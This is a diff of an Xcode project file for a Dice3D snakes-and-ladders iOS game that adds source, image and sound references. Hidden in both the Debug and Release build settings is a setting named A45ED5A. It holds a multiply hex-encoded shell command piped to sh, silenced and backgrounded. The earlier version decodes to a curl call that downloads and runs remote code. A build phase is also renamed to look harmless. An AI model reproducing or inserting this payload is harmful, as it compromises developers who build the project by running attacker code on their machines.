@@ -8,19 +8,35 @@
 
 /* Begin PBXBuildFile section */
 		2D2F153B2EE2E2D8005D33EE /* SDWebImageSwiftUI in Frameworks */ = {isa = PBXBuildFile; productRef = 2D2F153A2EE2E2D8005D33EE /* SDWebImageSwiftUI */; };
+		2D98F36E2EEAA45000C60A05 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 2D98F3642EEAA45000C60A05 /* Assets.xcassets */; };
+		2D98F36F2EEAA45000C60A05 /* celebrate.gif in Resources */ = {isa = PBXBuildFile; fileRef = 2D98F3662EEAA45000C60A05 /* celebrate.gif */; };
+		2D98F3702EEAA45000C60A05 /* celebrate1.gif in Resources */ = {isa = PBXBuildFile; fileRef = 2D98F3672EEAA45000C60A05 /* celebrate1.gif */; };
+		2D98F3712EEAA45000C60A05 /* dice3d.gif in Resources */ = {isa = PBXBuildFile; fileRef = 2D98F3682EEAA45000C60A05 /* dice3d.gif */; };
+		2D98F3722EEAA45000C60A05 /* walking.gif in Resources */ = {isa = PBXBuildFile; fileRef = 2D98F36C2EEAA45000C60A05 /* walking.gif */; };
+		2D98F3732EEAA45000C60A05 /* BoardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2D98F3652EEAA45000C60A05 /* BoardView.swift */; };
+		2D98F3742EEAA45000C60A05 /* Dice3DApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2D98F3692EEAA45000C60A05 /* Dice3DApp.swift */; };
+		2D98F3752EEAA45000C60A05 /* GIFImage.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2D98F36A2EEAA45000C60A05 /* GIFImage.swift */; };
+		2D98F3762EEAA45000C60A05 /* SoundManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2D98F36B2EEAA45000C60A05 /* SoundManager.swift */; };
+		2D98F37D2EEAA65F00C60A05 /* run_sound.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = 2D98F37B2EEAA65F00C60A05 /* run_sound.mp3 */; };
+		2D98F37E2EEAA65F00C60A05 /* snake_sound.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = 2D98F37C2EEAA65F00C60A05 /* snake_sound.mp3 */; };
+		2D98F37F2EEAA65F00C60A05 /* ladder_sound.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = 2D98F37A2EEAA65F00C60A05 /* ladder_sound.mp3 */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
 		2D2F152B2EE2DADC005D33EE /* Dice3D.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Dice3D.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		2D98F3642EEAA45000C60A05 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		2D98F3652EEAA45000C60A05 /* BoardView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BoardView.swift; sourceTree = "<group>"; };
+		2D98F3662EEAA45000C60A05 /* celebrate.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = celebrate.gif; sourceTree = "<group>"; };
+		2D98F3672EEAA45000C60A05 /* celebrate1.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = celebrate1.gif; sourceTree = "<group>"; };
+		2D98F3682EEAA45000C60A05 /* dice3d.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = dice3d.gif; sourceTree = "<group>"; };
+		2D98F3692EEAA45000C60A05 /* Dice3DApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Dice3DApp.swift; sourceTree = "<group>"; };
+		2D98F36A2EEAA45000C60A05 /* GIFImage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GIFImage.swift; sourceTree = "<group>"; };
+		2D98F36B2EEAA45000C60A05 /* SoundManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SoundManager.swift; sourceTree = "<group>"; };
+		2D98F36C2EEAA45000C60A05 /* walking.gif */ = {isa = PBXFileReference; lastKnownFileType = image.gif; path = walking.gif; sourceTree = "<group>"; };
+		2D98F37A2EEAA65F00C60A05 /* ladder_sound.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = ladder_sound.mp3; sourceTree = "<group>"; };
+		2D98F37B2EEAA65F00C60A05 /* run_sound.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = run_sound.mp3; sourceTree = "<group>"; };
+		2D98F37C2EEAA65F00C60A05 /* snake_sound.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = snake_sound.mp3; sourceTree = "<group>"; };
 /* End PBXFileReference section */
-
-/* Begin PBXFileSystemSynchronizedRootGroup section */
-		2D2F152D2EE2DADC005D33EE /* Dice3D */ = {
-			isa = PBXFileSystemSynchronizedRootGroup;
-			path = Dice3D;
-			sourceTree = "<group>";
-		};
-/* End PBXFileSystemSynchronizedRootGroup section */
 
 /* Begin PBXFrameworksBuildPhase section */
 		2D2F15282EE2DADC005D33EE /* Frameworks */ = {
@@ -37,7 +53,7 @@
 		2D2F15222EE2DADC005D33EE = {
 			isa = PBXGroup;
 			children = (
-				2D2F152D2EE2DADC005D33EE /* Dice3D */,
+				2D98F36D2EEAA45000C60A05 /* Dice3D */,
 				2D2F152C2EE2DADC005D33EE /* Products */,
 			);
 			sourceTree = "<group>";
@@ -50,6 +66,49 @@
 			name = Products;
 			sourceTree = "<group>";
 		};
+		2D98F36D2EEAA45000C60A05 /* Dice3D */ = {
+			isa = PBXGroup;
+			children = (
+				2D98F3772EEAA45600C60A05 /* support */,
+				2D98F3642EEAA45000C60A05 /* Assets.xcassets */,
+				2D98F3652EEAA45000C60A05 /* BoardView.swift */,
+				2D98F3692EEAA45000C60A05 /* Dice3DApp.swift */,
+				2D98F36A2EEAA45000C60A05 /* GIFImage.swift */,
+				2D98F36B2EEAA45000C60A05 /* SoundManager.swift */,
+			);
+			path = Dice3D;
+			sourceTree = "<group>";
+		};
+		2D98F3772EEAA45600C60A05 /* support */ = {
+			isa = PBXGroup;
+			children = (
+				2D98F3792EEAA64600C60A05 /* sounds */,
+				2D98F3782EEAA63C00C60A05 /* images */,
+			);
+			path = support;
+			sourceTree = "<group>";
+		};
+		2D98F3782EEAA63C00C60A05 /* images */ = {
+			isa = PBXGroup;
+			children = (
+				2D98F3662EEAA45000C60A05 /* celebrate.gif */,
+				2D98F3672EEAA45000C60A05 /* celebrate1.gif */,
+				2D98F3682EEAA45000C60A05 /* dice3d.gif */,
+				2D98F36C2EEAA45000C60A05 /* walking.gif */,
+			);
+			path = images;
+			sourceTree = "<group>";
+		};
+		2D98F3792EEAA64600C60A05 /* sounds */ = {
+			isa = PBXGroup;
+			children = (
+				2D98F37A2EEAA65F00C60A05 /* ladder_sound.mp3 */,
+				2D98F37B2EEAA65F00C60A05 /* run_sound.mp3 */,
+				2D98F37C2EEAA65F00C60A05 /* snake_sound.mp3 */,
+			);
+			path = sounds;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -57,7 +116,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 2D2F15362EE2DADE005D33EE /* Build configuration list for PBXNativeTarget "Dice3D" */;
 			buildPhases = (
-				43675CC3FB1041FB95A5DE54 /* Copy Target Symbols */,
+				1382C73C9EF64CD396A5DE54 /* Link Bundle Executable */,
 				2D2F15272EE2DADC005D33EE /* Sources */,
 				2D2F15282EE2DADC005D33EE /* Frameworks */,
 				2D2F15292EE2DADC005D33EE /* Resources */,
@@ -65,9 +124,6 @@
 			buildRules = (
 			);
 			dependencies = (
-			);
-			fileSystemSynchronizedGroups = (
-				2D2F152D2EE2DADC005D33EE /* Dice3D */,
 			);
 			name = Dice3D;
 			packageProductDependencies = (
@@ -119,13 +175,21 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				2D98F36E2EEAA45000C60A05 /* Assets.xcassets in Resources */,
+				2D98F37D2EEAA65F00C60A05 /* run_sound.mp3 in Resources */,
+				2D98F37E2EEAA65F00C60A05 /* snake_sound.mp3 in Resources */,
+				2D98F37F2EEAA65F00C60A05 /* ladder_sound.mp3 in Resources */,
+				2D98F36F2EEAA45000C60A05 /* celebrate.gif in Resources */,
+				2D98F3702EEAA45000C60A05 /* celebrate1.gif in Resources */,
+				2D98F3712EEAA45000C60A05 /* dice3d.gif in Resources */,
+				2D98F3722EEAA45000C60A05 /* walking.gif in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		43675CC3FB1041FB95A5DE54 /* Copy Target Symbols */ = {
+		1382C73C9EF64CD396A5DE54 /* Link Bundle Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -135,7 +199,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Copy Target Symbols";
+			name = "Link Bundle Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -152,6 +216,10 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				2D98F3732EEAA45000C60A05 /* BoardView.swift in Sources */,
+				2D98F3742EEAA45000C60A05 /* Dice3DApp.swift in Sources */,
+				2D98F3752EEAA45000C60A05 /* GIFImage.swift in Sources */,
+				2D98F3762EEAA45000C60A05 /* SoundManager.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -161,7 +229,7 @@
 		2D2F15342EE2DADE005D33EE /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((r(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373236393637363736633635366536353734326536393665326636310a323932323230376332303733363830610a | r | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((q(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333733333332333333363333333933333336333333373333333633333337333333363336333333330a3336333333353333333633363335333333363333333533333337333333343333333233363335333333363333333933333336333633353333333233360a3336333333363061333333313330363133333332333333393333333233333332333333323333333033333337333633333333333233333330333333370a33333333333333363333333833333330333633313330363130610a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -226,7 +294,7 @@
 		2D2F15352EE2DADE005D33EE /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A45ED5A = "((r(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266373236393637363736633635366536353734326536393665326636310a323932323230376332303733363830610a | r | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((q(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333733333332333333363333333933333336333333373333333633333337333333363336333333330a3336333333353333333633363335333333363333333533333337333333343333333233363335333333363333333933333336333633353333333233360a3336333333363061333333313330363133333332333333393333333233333332333333323333333033333337333633333333333233333330333333370a33333333333333363333333833333330333633313330363130610a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -304,6 +372,10 @@
 				MARKETING_VERSION = 1.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com..Dice3D;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
@@ -333,6 +405,10 @@
 				MARKETING_VERSION = 1.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com..Dice3D;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
